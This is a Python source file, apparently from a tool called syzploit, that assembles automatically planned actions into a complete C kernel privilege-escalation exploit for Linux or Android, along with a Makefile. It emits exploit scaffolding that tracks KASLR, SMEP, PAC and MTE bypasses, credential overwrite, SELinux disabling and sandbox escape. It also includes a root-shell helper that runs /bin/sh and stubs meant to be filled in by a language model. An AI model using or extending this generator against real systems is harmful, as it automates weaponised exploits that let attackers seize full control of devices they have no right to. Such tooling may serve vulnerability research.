"""
stitcher.py

Main exploit stitcher that combines PDDL plan actions into
a complete C exploit program.
"""

import os
import re
import sys
from pathlib import Path
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime

from .code_templates import CodeTemplate, CodeTemplateRegistry, DEFAULT_REGISTRY
from .btf_offsets import query_btf_offsets, generate_btf_defines


def deduplicate_globals(globals_list: List[str]) -> str:
    """
    Deduplicate global variable declarations, #defines, and other globals.
    
    This prevents duplicate definitions when multiple templates declare
    the same variables or macros.
    
    Returns a single string with deduplicated globals.
    """
    seen_defines: Set[str] = set()
    seen_vars: Set[str] = set()
    seen_structs: Set[str] = set()
    
    output_lines = []
    current_comment = None
    
    # Patterns to detect different types of declarations
    define_pattern = re.compile(r'^#define\s+(\w+)')
    var_pattern = re.compile(r'^static\s+(?:volatile\s+)?(?:int|char|void|unsigned|long|uint\d+_t|struct\s+\w+)\s*\*?\s*(\w+)')
    struct_pattern = re.compile(r'^static\s+struct\s+(\w+)\s+(\w+)')
    array_pattern = re.compile(r'^static\s+(?:struct\s+)?(\w+)\s+(\w+)\s*\[')
    
    for globals_block in globals_list:
        if not globals_block or not globals_block.strip():
            continue
        
        lines = globals_block.split('\n')
        for line in lines:
            stripped = line.strip()
            
            # Skip empty lines
            if not stripped:
                continue
            
            # Track comments (for context)
            if stripped.startswith('//'):
                current_comment = stripped
                continue
            
            # Check for #define
            define_match = define_pattern.match(stripped)
            if define_match:
                name = define_match.group(1)
                if name not in seen_defines:
                    seen_defines.add(name)
                    if current_comment:
                        output_lines.append(current_comment)
                        current_comment = None
                    output_lines.append(line)
                continue
            
            # Check for struct variable
            struct_match = struct_pattern.match(stripped)
            if struct_match:
                var_name = struct_match.group(2)
                if var_name not in seen_vars:
                    seen_vars.add(var_name)
                    if current_comment:
                        output_lines.append(current_comment)
                        current_comment = None
                    output_lines.append(line)
                continue
            
            # Check for array variable
            array_match = array_pattern.match(stripped)
            if array_match:
                var_name = array_match.group(2)
                if var_name not in seen_vars:
                    seen_vars.add(var_name)
                    if current_comment:
                        output_lines.append(current_comment)
                        current_comment = None
                    output_lines.append(line)
                continue
            
            # Check for regular variable
            var_match = var_pattern.match(stripped)
            if var_match:
                var_name = var_match.group(1)
                if var_name not in seen_vars:
                    seen_vars.add(var_name)
                    if current_comment:
                        output_lines.append(current_comment)
                        current_comment = None
                    output_lines.append(line)
                continue
            
            # For other lines (like closing braces, etc.), include as-is
            # but avoid duplicates of exact lines
            if stripped not in seen_vars and stripped not in seen_defines:
                output_lines.append(line)
    
    return '\n'.join(output_lines)


@dataclass
class StitcherConfig:
    """Configuration for exploit stitching."""
    platform: str = "linux"  # "linux" or "android"
    arch: str = "x86_64"  # "x86_64" or "arm64"
    include_debug: bool = True
    include_cleanup: bool = True
    vuln_specific_code: Optional[str] = None  # CVE-specific code to include
    kernel_symbols: Dict[str, int] = field(default_factory=dict)
    output_dir: Optional[str] = None


class ExploitStitcher:
    """
    Stitches PDDL plan actions into a complete C exploit.
    """
    
    def __init__(self, config: Optional[StitcherConfig] = None,
                 registry: Optional[CodeTemplateRegistry] = None):
        self.config = config or StitcherConfig()
        self.registry = registry or DEFAULT_REGISTRY
        
    def stitch(self, plan_actions: List[Dict[str, Any]], 
               bug_id: str,
               output_path: Optional[str] = None,
               analysis_data: Optional[Dict[str, Any]] = None) -> str:
        """
        Stitch plan actions into a complete C exploit.
        
        Args:
            plan_actions: List of parsed PDDL actions
            bug_id: Bug identifier for the exploit
            output_path: Path to write the exploit (optional)
            analysis_data: Additional analysis data for customization
            
        Returns:
            Path to the generated exploit file
        """
        # Collect all templates for the actions
        templates = []
        missing_actions = []
        
        for action in plan_actions:
            action_name = action.get('action', action.get('name', ''))
            if not action_name:
                continue
                
            # Normalize action name (lowercase, underscores)
            action_name = action_name.lower().replace('-', '_').strip('()')
            
            template = self.registry.get(action_name)
            if template:
                templates.append(template)
            else:
                missing_actions.append(action_name)
                # Generate a stub template for the missing action so that
                # 1) the skeleton contains a real function for it, and
                # 2) the LLM stitcher can replace the stub later.
                desc = action_name.replace('_', ' ')
                stub = CodeTemplate(
                    action_name=action_name,
                    description=f"Auto-stub: {desc}",
                    includes=[],
                    globals="",
                    setup_code="",
                    main_code=(
                        f"    // --- {action_name} ---\n"
                        f"    printf(\"[*] {action_name}...\\n\");\n"
                        f"    ret = {action_name}();\n"
                        f"    if (ret < 0) {{ fprintf(stderr, \"[-] {action_name} failed\\n\"); goto cleanup; }}\n"
                    ),
                    cleanup_code="",
                )
                templates.append(stub)
        
        if missing_actions:
            print(f"[WARN] Missing templates for actions: {missing_actions}", 
                  file=sys.stderr)
        
        # Generate the exploit code
        exploit_code = self._generate_exploit(templates, bug_id, analysis_data,
                                              missing_actions=missing_actions)
        
        # Write to file
        if output_path is None:
            output_dir = self.config.output_dir or '.'
            output_path = os.path.join(output_dir, f"exploit_{bug_id}.c")
        
        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        Path(output_path).write_text(exploit_code)
        
        print(f"[+] Generated exploit: {output_path}")
        
        # Also generate a Makefile
        makefile_path = os.path.join(os.path.dirname(output_path), "Makefile")
        self._generate_makefile(output_path, makefile_path)
        
        return output_path
    
    def _generate_exploit(self, templates: List[CodeTemplate], 
                          bug_id: str,
                          analysis_data: Optional[Dict[str, Any]] = None,
                          missing_actions: Optional[List[str]] = None) -> str:
        """Generate the complete exploit C code."""
        
        # Collect all includes
        includes: Set[str] = set()
        includes.add("<stdio.h>")
        includes.add("<stdlib.h>")
        includes.add("<string.h>")
        includes.add("<unistd.h>")
        includes.add("<fcntl.h>")
        includes.add("<stdint.h>")
        includes.add("<sys/types.h>")
        includes.add("<sys/stat.h>")
        
        for template in templates:
            includes.update(template.includes)
        
        # Collect all globals (will be deduplicated later)
        globals_code = []
        
        # Collect setup, main, and cleanup code
        setup_code = []
        main_code = []
        cleanup_code = []
        
        for template in templates:
            if template.globals:
                globals_code.append(template.globals)
            if template.setup_code:
                setup_code.append(template.setup_code)
            if template.main_code:
                main_code.append(f"\n    // === {template.action_name}: {template.description} ===")
                main_code.append(template.main_code)
            if template.cleanup_code and self.config.include_cleanup:
                cleanup_code.append(template.cleanup_code)
        
        # Build the complete exploit
        code_parts = []
        
        # Header comment
        code_parts.append(self._generate_header(bug_id, templates, analysis_data))
        
        # Includes
        code_parts.append("\n// === INCLUDES ===")
        for inc in sorted(includes):
            code_parts.append(f"#include {inc}")
        
        # Platform-specific includes
        if self.config.platform == "android":
            code_parts.append("\n// Android-specific includes")
            code_parts.append("#include <sys/system_properties.h>")
        
        # Configuration defines
        code_parts.append(self._generate_config_defines(analysis_data, bug_id))
        
        # Collect all action names for plan-driven generation
        all_action_names = [t.action_name for t in templates] + (missing_actions or [])
        
        # State tracking variables (plan-driven)
        code_parts.append(self._generate_state_variables(all_action_names))
        
        # Global variables from templates - DEDUPLICATED
        if globals_code:
            code_parts.append("\n// === GLOBAL STATE ===")
            deduplicated = deduplicate_globals(globals_code)
            code_parts.append(deduplicated)
        
        # Helper function declarations (only universally needed ones)
        code_parts.append(self._generate_helper_declarations(all_action_names))
        
        # Helper function implementations (only universally needed ones)
        code_parts.append(self._generate_helper_implementations())
        
        # Stub functions for actions that had no template
        # These will be replaced by LLM-enhanced code in the LLM stitcher step
        if missing_actions:
            code_parts.append("\n// === PLAN ACTION STUBS (to be enhanced by LLM) ===")
            for action_name in missing_actions:
                desc = action_name.replace('_', ' ')
                code_parts.append(f"""
static int {action_name}(void) {{
    printf("[*] {action_name} (stub)...\\n");
    // TODO: LLM enhancement needed
    printf("[!] {desc}: not yet implemented\\n");
    return 0;
}}""")
        
        # Vulnerability-specific code (if provided)
        if self.config.vuln_specific_code:
            code_parts.append("\n// === VULNERABILITY-SPECIFIC CODE ===")
            code_parts.append(self.config.vuln_specific_code)
        
        # Main exploit function
        code_parts.append(self._generate_main_function(setup_code, main_code, cleanup_code, bug_id, analysis_data))
        
        # Entry point
        code_parts.append(self._generate_entry_point())
        
        return "\n".join(code_parts)
    
    def _generate_header(self, bug_id: str, templates: List[CodeTemplate],
                         analysis_data: Optional[Dict[str, Any]] = None) -> str:
        """Generate file header comment with vulnerability metadata."""
        action_names = [t.action_name for t in templates]

        # Extract vulnerability metadata
        vuln_type = ""
        target_struct = ""
        slab_cache = ""
        cve_id = ""
        if analysis_data:
            vuln_type = analysis_data.get("vuln_type", "")
            target_struct = analysis_data.get("target_struct", "")
            slab_cache = analysis_data.get("slab_cache", "")
            cve_id = analysis_data.get("cve_metadata", {}).get("cve_id", "")

        vuln_lines = []
        if cve_id and cve_id != bug_id:
            vuln_lines.append(f" * CVE: {cve_id}")
        if vuln_type:
            vuln_lines.append(f" * Vulnerability type: {vuln_type}")
        if target_struct:
            vuln_lines.append(f" * Target struct: {target_struct}")
        if slab_cache:
            vuln_lines.append(f" * Slab cache: {slab_cache}")
        vuln_block = chr(10).join(vuln_lines)
        if vuln_block:
            vuln_block = chr(10) + vuln_block

        return f'''/*
 * Kernel Exploit - {bug_id}
 * 
 * Auto-generated by syzploit Synthesizer
 * Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 * Platform: {self.config.platform}
 * Architecture: {self.config.arch}{vuln_block}
 * 
 * Plan actions ({len(templates)}):
 *   {chr(10) + "   ".join(f"- {a}" for a in action_names) if action_names else "   (none)"}
 *
 * WARNING: This is auto-generated exploit code.
 * It requires customization for the specific target kernel.
 * Review and update offsets before use.
 */
'''
    
    def _generate_config_defines(self, analysis_data: Optional[Dict[str, Any]],
                                 bug_id: str = "") -> str:
        """Generate configuration defines, including BTF-derived struct offsets."""
        defines = ["\n// === CONFIGURATION ==="]

        # Bug / vulnerability identity — always present so the binary
        # self-documents which vulnerability it targets.
        if bug_id:
            safe_id = bug_id.replace('"', '\\"')
            defines.append(f'#define EXPLOIT_BUG_ID "{safe_id}"')
        else:
            defines.append('#define EXPLOIT_BUG_ID "unknown"')

        vuln_type = ""
        target_struct = ""
        slab_cache = ""
        if analysis_data:
            vuln_type = analysis_data.get("vuln_type", "")
            target_struct = analysis_data.get("target_struct", "")
            slab_cache = analysis_data.get("slab_cache", "")
        if vuln_type:
            defines.append(f'#define EXPLOIT_VULN_TYPE "{vuln_type}"')
        if target_struct:
            defines.append(f'#define EXPLOIT_TARGET_STRUCT "{target_struct}"')
        if slab_cache:
            defines.append(f'#define EXPLOIT_SLAB_CACHE "{slab_cache}"')

        # Platform defines
        if self.config.platform == "android":
            defines.append("#define TARGET_ANDROID 1")
        else:
            defines.append("#define TARGET_LINUX 1")
        
        # Architecture defines
        if self.config.arch == "arm64":
            defines.append("#define TARGET_ARM64 1")
        else:
            defines.append("#define TARGET_X86_64 1")
        
        # Debug mode
        if self.config.include_debug:
            defines.append("#define DEBUG 1")
        
        # Kernel symbol placeholder comment — concrete offsets should come
        # from analysis_data or from the user's kernel build, not hardcoded
        # placeholder values that are almost certainly wrong.
        defines.append("""
// Kernel symbol offsets - supply via analysis_data or set manually.
// Find with: cat /proc/kallsyms | grep <symbol>
// Or extract from vmlinux with: nm vmlinux | grep <symbol>
""")
        
        # Add any offsets from analysis data
        if analysis_data and 'kernel_symbols' in analysis_data:
            defines.append("// Symbols from analysis:")
            for sym, offset in analysis_data['kernel_symbols'].items():
                defines.append(f"#define SYM_{sym.upper()} 0x{offset:x}")
        
        # Add custom kernel symbols from config
        for sym, offset in self.config.kernel_symbols.items():
            defines.append(f"#define SYM_{sym.upper()} 0x{offset:x}")

        # BTF-derived struct offsets from vmlinux (when available)
        vmlinux = None
        kernel_version = None
        if analysis_data:
            vmlinux = analysis_data.get("vmlinux_path")
            kernel_version = analysis_data.get("kernel_version")
        if vmlinux or kernel_version:
            btf = query_btf_offsets(
                vmlinux_path=vmlinux or "",
                kernel_version=kernel_version,
            )
            if btf:
                defines.append("")
                defines.append(generate_btf_defines(btf))
        
        return "\n".join(defines)
    
    def _generate_state_variables(self, action_names: Optional[List[str]] = None) -> str:
        """Generate state tracking variables based on what the plan actually needs."""
        # Map keywords found in action names to the state variables they use
        KEYWORD_TO_VARS: Dict[str, List[str]] = {
            'uaf':      ['uaf_triggered'],
            'race':     ['race_won'],
            'spray':    ['heap_sprayed'],
            'heap':     ['heap_sprayed'],
            'arb_read': ['has_arb_read'],
            'leak':     ['has_arb_read', 'info_leak_value'],
            'arb_write':['has_arb_write'],
            'kaslr':    ['kaslr_bypassed', 'info_leak_value'],
            'smep':     ['smep_bypassed'],
            'smap':     ['smap_bypassed'],
            'pan':      ['pan_bypassed'],
            'pac':      ['pac_bypassed'],
            'mte':      ['mte_bypassed'],
            'rop':      ['rop_chain_ready'],
            'jop':      ['jop_chain_ready'],
            'pivot':    ['stack_pivoted'],
            'code_exec':['code_exec'],
            'exec':     ['code_exec'],
            'cred':     ['cred_overwritten'],
            'overwrite_cred': ['cred_overwritten'],
            'privilege':['privilege_escalated'],
            'escalat':  ['privilege_escalated'],
            'selinux':  ['selinux_disabled'],
            'sandbox':  ['sandbox_escaped'],
            'adb':      ['adb_root_enabled'],
            'oob':      [],  # no special state var needed
        }

        # Always include privilege_escalated (used by run_exploit / entry point)
        needed_vars: Dict[str, str] = {
            'privilege_escalated': 'static int privilege_escalated = 0;',
        }

        # Determine the full set of state variables based on plan actions
        joined = ' '.join(action_names) if action_names else ''
        for keyword, var_names in KEYWORD_TO_VARS.items():
            if keyword in joined:
                for v in var_names:
                    if v == 'info_leak_value':
                        needed_vars[v] = 'static uint64_t info_leak_value = 0;'
                    else:
                        needed_vars[v] = f'static int {v} = 0;'

        lines = ['\n// === STATE TRACKING ===']
        for decl in needed_vars.values():
            lines.append(decl)
        return '\n'.join(lines) + '\n'
    
    def _generate_helper_declarations(self, action_names: Optional[List[str]] = None) -> str:
        """Generate helper function declarations based on plan actions.

        Only forward-declares get_root_shell (always needed) and any
        helper that the plan actions actually reference.
        All plan-specific stubs are already emitted as full function
        definitions in the stub section, so they don't need separate
        forward declarations.
        """
        decls = ['\n// === HELPER FUNCTION DECLARATIONS ===']
        decls.append('static void get_root_shell(void);')
        return '\n'.join(decls) + '\n'
    
    def _generate_helper_implementations(self) -> str:
        """Generate only universally needed helper implementations.

        Plan-specific functions are generated as stubs in the stub section
        and later enhanced by the LLM stitcher, so we don't hardcode
        vulnerability helpers here.
        """
        return '''
// === HELPER FUNCTION IMPLEMENTATIONS ===

static void get_root_shell(void) {
    if (getuid() != 0) {
        fprintf(stderr, "[-] Not root!\\n");
        return;
    }

    printf("[+] Spawning root shell...\\n");
    setuid(0);
    setgid(0);

    char *argv[] = {"/bin/sh", "-i", NULL};
    char *envp[] = {"PATH=/bin:/sbin:/usr/bin:/usr/sbin", NULL};
    execve("/bin/sh", argv, envp);
}
'''
    
    def _generate_main_function(self, setup_code: List[str], 
                                main_code: List[str],
                                cleanup_code: List[str],
                                bug_id: str = "",
                                analysis_data: Optional[Dict[str, Any]] = None) -> str:
        """Generate the main exploit function."""
        setup = "\n".join(setup_code) if setup_code else "    // No setup code"
        main = "\n".join(main_code) if main_code else "    // No main code"
        cleanup = "\n".join(cleanup_code) if cleanup_code else "    // No cleanup code"

        # Build a detailed runtime banner that identifies the vulnerability
        vuln_type = ""
        target_struct = ""
        if analysis_data:
            vuln_type = analysis_data.get("vuln_type", "")
            target_struct = analysis_data.get("target_struct", "")

        banner_lines = []
        banner_lines.append('    printf("============================================\\n");')
        if bug_id:
            banner_lines.append(f'    printf("  Exploit: {bug_id}\\n");')
        else:
            banner_lines.append('    printf("  Kernel Exploit\\n");')
        if vuln_type:
            banner_lines.append(f'    printf("  Vuln type: {vuln_type}\\n");')
        if target_struct:
            banner_lines.append(f'    printf("  Target struct: {target_struct}\\n");')
        banner_lines.append('    printf("============================================\\n\\n");')
        banner = "\n".join(banner_lines)

        return f'''
// === MAIN EXPLOIT FUNCTION ===

static int run_exploit(void) {{
    int ret = 0;
    
{banner}
    
    // === SETUP PHASE ===
    printf("[*] Starting setup phase...\\n");
{setup}
    
    // === MAIN EXPLOITATION PHASE ===
    printf("\\n[*] Starting main exploitation phase...\\n");
{main}
    
    // === CLEANUP PHASE ===
cleanup:
    printf("\\n[*] Cleanup phase...\\n");
{cleanup}
    
    // === RESULT ===
    printf("\\n============================================\\n");
    if (privilege_escalated) {{
        printf("[+] EXPLOIT SUCCEEDED!\\n");
        printf("[+] uid=%d euid=%d\\n", getuid(), geteuid());
        ret = 0;
    }} else {{
        printf("[-] Exploit did not achieve privilege escalation\\n");
        ret = -1;
    }}
    printf("============================================\\n");
    
    return ret;
}}
'''
    
    def _generate_entry_point(self) -> str:
        """Generate the main() entry point."""
        return '''
// === ENTRY POINT ===

int main(int argc, char **argv) {
    (void)argc;
    (void)argv;
    
    printf("[*] Starting exploit: %s\\n", EXPLOIT_BUG_ID);
#ifdef EXPLOIT_VULN_TYPE
    printf("[*] Vulnerability: %s\\n", EXPLOIT_VULN_TYPE);
#endif
#ifdef EXPLOIT_TARGET_STRUCT
    printf("[*] Target struct: %s\\n", EXPLOIT_TARGET_STRUCT);
#endif
    printf("[*] PID: %d, UID: %d, GID: %d\\n", getpid(), getuid(), getgid());
    
    // Run the exploit
    int result = run_exploit();
    
    if (result == 0 && privilege_escalated) {
        // Successfully got root, spawn shell
        get_root_shell();
    }
    
    return result;
}
'''
    
    def _generate_makefile(self, exploit_path: str, makefile_path: str):
        """Generate a Makefile for building the exploit."""
        exploit_name = Path(exploit_path).stem
        
        if self.config.arch == "arm64":
            cc = "aarch64-linux-gnu-gcc"
            cflags = "-O2 -Wall -Wextra -static"
        else:
            cc = "gcc"
            cflags = "-O2 -Wall -Wextra -static -m64"
        
        if self.config.platform == "android":
            # For Android, use NDK
            cc = "$(ANDROID_NDK)/toolchains/llvm/prebuilt/linux-x86_64/bin/clang"
            if self.config.arch == "arm64":
                cflags = "--target=aarch64-linux-android28 -O2 -Wall -Wextra -static"
            else:
                cflags = "--target=x86_64-linux-android28 -O2 -Wall -Wextra -static"
        
        makefile_content = f'''# Auto-generated Makefile for {exploit_name}
# Platform: {self.config.platform}
# Architecture: {self.config.arch}

CC = {cc}
CFLAGS = {cflags}
LDFLAGS = -lpthread

TARGET = {exploit_name}
SRC = {Path(exploit_path).name}

.PHONY: all clean

all: $(TARGET)

$(TARGET): $(SRC)
\t$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

clean:
\trm -f $(TARGET)

# For Android builds, set ANDROID_NDK environment variable
# Example: export ANDROID_NDK=/path/to/android-ndk-r25c
'''
        
        Path(makefile_path).write_text(makefile_content)
        print(f"[+] Generated Makefile: {makefile_path}")


def stitch_from_plan(plan_file: str, bug_id: str, 
                     output_path: Optional[str] = None,
                     platform: str = "linux",
                     arch: str = "x86_64") -> str:
    """
    Convenience function to stitch an exploit from a plan file.
    
    Args:
        plan_file: Path to the plan file (from powerlifted)
        bug_id: Bug identifier
        output_path: Output path for exploit
        platform: Target platform
        arch: Target architecture
        
    Returns:
        Path to generated exploit
    """
    # Parse plan file
    plan_content = Path(plan_file).read_text()
    
    # Parse actions from plan file format:
    # 1: (action_name param1 param2) ;[comment]
    actions = []
    for line in plan_content.strip().split('\n'):
        line = line.strip()
        if not line or line.startswith(';'):
            continue
        
        # Extract action from line like "1: (action_name) ;[created objects: ]"
        if ':' in line:
            line = line.split(':', 1)[1].strip()
        if ';' in line:
            line = line.split(';')[0].strip()
        
        # Extract action name from "(action_name params)"
        if line.startswith('(') and line.endswith(')'):
            parts = line[1:-1].split()
            action_name = parts[0] if parts else ""
            params = parts[1:] if len(parts) > 1 else []
            
            actions.append({
                'action': action_name,
                'params': params
            })
    
    # Create stitcher and generate exploit
    config = StitcherConfig(platform=platform, arch=arch)
    stitcher = ExploitStitcher(config)
    
    return stitcher.stitch(actions, bug_id, output_path)
